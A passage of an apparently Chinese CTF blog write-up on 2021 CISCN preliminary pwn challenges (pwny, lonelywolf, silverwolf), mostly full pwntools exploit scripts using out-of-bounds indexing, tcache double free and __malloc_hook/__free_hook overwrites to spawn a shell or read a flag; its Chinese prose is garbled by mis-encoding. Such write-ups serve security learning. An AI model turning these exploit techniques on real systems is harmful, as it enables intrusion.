class="hljs-title">read_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.send(p64(idx))<br>write_s(<span class="hljs-number">0x100</span>)<br>write_s(<span class="hljs-number">0x100</span>)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x3ec680</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.address)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFF5</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)+<span class="hljs-number">0x58</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(pie)<br>write_s((libc.address+<span class="hljs-number">0x61b968</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>gdb.attach(p)<br>write_s((libc.address+<span class="hljs-number">0x61bf60</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§åšæ³•æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œscanfå‡½æ•°åœ¨é‡åˆ°è¿‡é•¿è¾“å…¥æ—¶ä¼šç”³è¯·å †ã€‚å‰é¢åœ¨æ³„æ¼PIEå’Œlibcæ˜¯ä¸€è‡´çš„ï¼Œgetshellæ—¶ï¼Œè®©æ•°ç»„è¶Šç•Œè®¿é—®åˆ°__malloc_hooké‚£è¾¹å»ï¼Œå†™å…¥one_gadget</p>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))  <span class="hljs-comment"># bss --&gt; stderr</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))  <span class="hljs-comment"># data --&gt; off_202008</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(base)<br>m_hook = base+libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;m_hook: &quot;</span>, <span class="hljs-built_in">hex</span>(m_hook)<br>realloc = base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc)<br>oneshot = [<span class="hljs-number">0x4f3d5</span>, <span class="hljs-number">0x4f432</span>, <span class="hljs-number">0x10a41c</span>]<br>oneshot = base+oneshot[<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;oneshot: &quot;</span>, <span class="hljs-built_in">hex</span>(oneshot)<br><br>offset = (m_hook-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span><br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;offset: &quot;</span>, offset<br>write_con(<span class="hljs-built_in">int</span>(offset), p64(realloc+<span class="hljs-number">9</span>))<br>gdb.attach(p)<br>write_con(<span class="hljs-built_in">int</span>(offset-<span class="hljs-number">1</span>), p64(oneshot))<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">0x400</span>)   <span class="hljs-comment"># scanf</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ç§åœ¨æ ˆä¸Šè¿›è¡Œè·³è½¬ï¼Œè¿™é‡Œå°±ä¸ä¿®æ”¹å’Œè§£é‡Šäº†ï¼Œä¸€ä¸ªå¤§ä½¬ç›´æ¥å¤åˆ¶è¿‡æ¥çš„ï¼Œå°±çº¯ç²¹è®°å½•çŸ¥è¯†ç‚¹ï¼šlibcä¸­environå­˜å‚¨äº†æ ˆä¸Šç¯å¢ƒå˜é‡</p>
<p>exp3ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ld_path = <span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/ld-2.27.so&quot;</span><br><span class="hljs-comment"># libc_path = &quot;/home/fanxinli/ctf_go/pwn/ciscn/pwny/libc-2.27.so&quot;</span><br><span class="hljs-comment">#   p = remote(&quot;124.71.230.113&quot;, 24425)</span><br>p = process([ld_path, <span class="hljs-string">&quot;./pwny&quot;</span>])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><span class="hljs-comment"># count</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>environ = base+libc.sym[<span class="hljs-string">&quot;environ&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ: &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br>oneshot = [<span class="hljs-number">0x415b6</span>, <span class="hljs-number">0x4160a</span>, <span class="hljs-number">0xdfae1</span>]<br>oneshot = base+oneshot[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># leak stack addr</span><br>offset = <span class="hljs-built_in">int</span>((environ-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>read(p64(offset &amp; <span class="hljs-number">0xffffffffffffffff</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>write_ret = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_ret: &quot;</span>, <span class="hljs-built_in">hex</span>(write_ret))<br><br><span class="hljs-comment"># attack</span><br>offset = <span class="hljs-built_in">int</span>((write_ret-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>write_con(offset, p64(oneshot))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="äºŒã€lonelywolf"><a href="#äºŒã€lonelywolf" class="headerlink" title="äºŒã€lonelywolf"></a>äºŒã€lonelywolf</h3><p>ç¨‹åºå­˜åœ¨UAFï¼Œdouble freeæŠŠå †å—ç”³è¯·åˆ°tcache ä¸Šï¼Œå°†ä¹‹é‡Šæ”¾å¾—åˆ°libcï¼Œç„¶ååˆ†é…åˆ°malloc_hookä¸Šæ‰§è¡Œone_gadgetå³å¯ï¼Œæ³¨æ„çš„æ˜¯double freeæ—¶ï¼Œè¦freeä¸€æ¬¡åå¾€é‡Œé¢å†™æ•°æ®è¦†ç›–keyï¼Œç»•è¿‡æ£€æŸ¥ï¼Œæ‰èƒ½äºŒæ¬¡free</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;124.70.0.162&#x27;,26313)</span><br>p=process(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><br>allocate(<span class="hljs-number">0x60</span>)<br>delete()<br>edit(p64(<span class="hljs-number">0</span>))<br>delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;heap addr:&quot;</span> + <span class="hljs-built_in">hex</span>(heap))<br>edit(p64(heap - <span class="hljs-number">0x250</span>))<br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):<br>	edit(p64(<span class="hljs-number">0</span>))<br>	delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>one_gadget = libc_base + <span class="hljs-number">0x10a41c</span>      <span class="hljs-comment">#0x4f3d5, 0x4f432, 0x10a41c</span><br>__malloc_hook = libc_base + __malloc_hook<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %__malloc_hook)<br>log.info(<span class="hljs-string">&quot;one_gadget:0x%x&quot;</span> %one_gadget)<br>allocate(<span class="hljs-number">0x50</span>)<br>edit(p64(<span class="hljs-number">0</span>))<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(__malloc_hook))<br>delete()<br>edit(p64(__malloc_hook))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(one_gadget))<br>gdb.attach(p,<span class="hljs-string">&quot;b*main&quot;</span>)<br>allocate(<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>æ—¶éš”å‡ æœˆï¼Œæ€»ç®—æ˜¯æœ‰èƒ½åŠ›æ¥å¤ç°äº†ï¼ŒçœŸä¸å®¹æ˜“ï¼Œä¸å¿˜åˆå¿ƒï¼Œç ¥ç ºå‰è¡Œï¼</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084726694.png" alt="image-20210925084726694"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084839791.png" alt="image-20210925084839791"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084858088.png" alt="image-20210925084858088"></p>
<p>ç¨‹åºä¸€å¼€å§‹å°±åˆå§‹åŒ–äº†æ²™ç®±ï¼Œçœ‹æ¥æ˜¯é“orwçš„é¢˜äº†</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085147596.png" alt="image-20210925085147596"></p>
<p>addåŠŸèƒ½é‡Œé¢ï¼Œåªèƒ½ç”³è¯·å°ç­‰äº0x78çš„å †å—ï¼Œç„¶åå †å—ç»“æ„ä½“åªå­˜æ”¾ä¸€ä¸ªå †å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åç»­æ“ä½œåªèƒ½å¯¹ç€å½“å‰å †å—è¿›è¡Œ</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085714119.png" alt="image-20210925085714119"></p>
<p>deleteåŠŸèƒ½å­˜åœ¨UAFæ¼æ´</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085753680.png" alt="image-20210925085753680"></p>
<p>showåŠŸèƒ½æ‰“å°å †å—å†…å®¹</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925090452594.png" alt="image-20210925090452594"></p>
<p>editåŠŸèƒ½å¾€å †å—é‡Œé¢å†™å†…å®¹</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925091304553.png" alt="image-20210925091304553"></p>
<p>ç”±äºå¼€å¯æ²™ç®±ï¼Œå †å—å­˜åœ¨ååˆ†å¤šï¼ŒæŠŠå­˜æ”¾æœ‰å †åœ°å€çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œæ³„éœ²å †åœ°å€</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094259648.png" alt="image-20210925094259648"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094827325.png" alt="image-20210925094827325"></p>
<p>é€šè¿‡å¾—åˆ°çš„å †åœ°å€ï¼Œä»¥åŠUAFæŠŠå †å—ç”³è¯·åˆ°tcacheä¸Šå»ï¼Œç„¶åä¿®æ”¹tcache entriesï¼Œç ´åç»“æ„ï¼Œç„¶åé‡Šæ”¾tcacheï¼Œå¾—åˆ°libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925102647508.png" alt="image-20210925102647508"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163718481.png" alt="image-20210925163718481"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163939660.png" alt="image-20210925163939660"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925164137807.png" alt="image-20210925164137807"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925165150750.png" alt="image-20210925165150750"></p>
<p>ç”±äºå‰é¢äº§ç”Ÿlibcåœ°å€ç ´åäº†å †å—ï¼Œæ‰€ä»¥è¦å†é‡æ–°ä¿®å¤ä¸€ä¸‹ï¼Œå¹¶ä¸”è¿˜è¦ç»§ç»­åˆ©ç”¨ï¼Œæ‰€ä»¥åœ¨ä¿®å¤çš„åŒæ—¶ä¹Ÿè¦å†æ¬¡è¦†ç›–chunkåœ¨ä¸Šé¢ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç”³è¯·çš„å †å—å¤§å°æœ‰é™åˆ¶ï¼Œæ‰€ä»¥è¦ä»æŠŠå †å—åŠ«æŒåˆ°0x20å¼€å§‹ï¼ˆå‰0x40æ˜¯countï¼‰ï¼Œç„¶åè¿™è¾¹ç”Ÿæˆå‡ºçš„å †å—æ˜¯0x40ï¼Œåˆšå¥½ï¼Œå¦‚æœæ˜¯ä»0x20å¼€å§‹ï¼Œä¸€ç›´åˆ°0x80éƒ½æ˜¯æˆ‘ä»¬èƒ½ç”³è¯·çš„å¤§å°ï¼Œè€Œè¿™è·¨åº¦åˆšå¥½æ˜¯0x38ï¼Œååˆ†å·§å¦™ï¼è†œæ‹œå¤§ä½¬ï¼</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925104646878.png" alt="image-20210925104646878"></p>
<p>ç„¶åå°±æ˜¯å¾€é‚£ä¸ªå †å—å¡«å……æˆ‘ä»¬éœ€è¦åˆ†é…å †å—çš„åœ°å€ï¼Œå°±å¯ä»¥ä¸€å—å—çš„åˆ†é…å‡ºå»ï¼Œå®Œæˆfree_hookå†™setcontextï¼Œè®¾ç½®â€™./flag\x00â€™åœ°å€ï¼Œgadgetæ‰€éœ€å¯„å­˜å™¨çš„å€¼è®¾ç½®ä»¥åŠropå¡«å……åœ°å€ï¼Œç­‰ç­‰</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925174414433.png" alt="image-20210925174414433"></p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹ï¼Œè¦ç”¨ç³»ç»Ÿè°ƒç”¨æ¥è°ƒç”¨openå‡½æ•°ï¼Œå¦åˆ™ä¼šåœ¨è¿è¡Œåˆ°openå‡½æ•°ç›´æ¥æŠ¥é”™é€€å‡ºï¼Œå…·ä½“ä¸æ‡‚ï¼Œæˆ‘è·Ÿè¸ªåˆ°openå‡½æ•°å‘ç°fdåˆ†é…åˆ°çš„æ•°å€¼å¾ˆå¤§ï¼Œrdiä»€ä¹ˆçš„ä¹Ÿæ˜¯ä¸å¯¹åŠ²ï¼Œå…·ä½“åŸå› ä¸æ˜ç™½ï¼Œç„¶åå°±æ˜¯ï¼Œåé¢è™½ç„¶ä¸€ä¸ªå †å—æ”¾ä¸ä¸‹ropï¼Œä½†æ˜¯ï¼Œåˆ†é…å‡ºå»çš„å †å—æˆ‘æƒŠè®¶çš„å‘ç°æ˜¯æ²¡æœ‰å †å¤´çš„ï¼Œæ‰€ä»¥ropä»ç„¶æ˜¯è¿è´¯çš„</p>
<p>æ€»çš„æ¥è¯´ï¼Œè¿˜æ˜¯å®Œæˆäº†ï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span 